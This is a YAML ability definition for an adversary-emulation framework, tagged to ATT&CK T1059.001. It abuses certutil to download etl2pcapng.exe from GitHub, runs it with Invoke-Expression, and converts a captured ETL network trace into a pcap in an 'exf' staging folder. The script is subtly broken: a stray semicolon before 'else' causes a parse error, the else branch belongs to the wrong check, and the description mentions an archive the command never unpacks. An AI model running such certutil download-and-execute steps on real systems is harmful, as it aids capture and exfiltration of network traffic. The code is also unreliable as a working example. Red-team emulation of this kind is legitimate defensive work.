- additional_info:
    cleanup: '[]'
  tactic: execution
  name: Download extract etl2pcapng to convert packet capture with certutil
  requirements: []
  buckets: []
  technique_id: T1059.001
  privilege: ''
  singleton: false
  plugin: ''
  executors:
  - additional_info: {}
    variations: []
    name: psh
    payloads: []
    cleanup:
    - Remove-Item -Path $env:PUBLIC\Toolz\etl2pcapng.exe
    language: null
    command: "$etl_capture_file = \"$env:PUBLIC\\exf\\capture.etl\";\n$pcap_file =\
      \ \"$env:PUBLIC\\exf\\capture.pcap\";\n$etl2pcapng_command = \"$env:PUBLIC\\\
      Toolz\\etl2pcapng.exe\";\n$exf_file = \"$env:PUBLIC\\exf\\capture.log\";\n\n\
      if ([System.IO.File]::Exists(\"$etl_capture_file\")) {\ncertutil -urlcache -f\
      \ https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.exe\
      \ \"$env:PUBLIC\\Toolz\\etl2pcapng.exe\";\nif ([System.IO.File]::Exists(\"$env:PUBLIC\\\
      Toolz\\etl2pcapng.exe\")) { \n$convert = \"$etl2pcapng_command\"+\" $etl_capture_file\"\
      +\" $pcap_file\";\nInvoke-Expression $convert | Out-File -FilePath \"$exf_file\"\
      ; ;\nAdd-Content -Path $exf_file \"The file $etl_capture_file has been converted\
      \ to $pcap_file. You can now read it with Wireshark\";\nexit 0;\n}; \nelse {\n\
      \  \"The The file $etl_capture_file does not exists !!!\" | Out-File -FilePath\
      \ \"$exf_file\";\n  exit 1;\n};\n}"
    timeout: 60
    uploads: []
    build_target: null
    code: null
    platform: windows
    parsers: []
  description: Downloads with certutil latest package of etl2pcapng, uncompress the
    archive  and convert etl capture to PCAPNG file
  repeatable: false
  access: {}
  delete_payload: true
  technique_name: 'Command and Scripting Interpreter: PowerShell'
  id: etl2pcap_download_and_use
